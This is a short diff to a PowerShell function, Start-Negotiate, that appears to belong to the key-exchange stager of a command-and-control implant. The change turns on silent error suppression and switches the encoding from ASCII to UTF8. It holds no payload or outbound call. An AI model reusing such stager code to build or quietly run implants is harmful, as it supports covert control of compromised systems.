@@ -56,8 +56,8 @@ function Start-Negotiate {
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
 
     # try to ignore all errors
-    #$ErrorActionPreference = "SilentlyContinue";
-    $e=[System.Text.Encoding]::ASCII;
+    $ErrorActionPreference = "SilentlyContinue";
+    $e=[System.Text.Encoding]::UTF8;
     $customHeaders = "";
     $SKB=$e.GetBytes($SK);
     # set up the AES/HMAC crypto
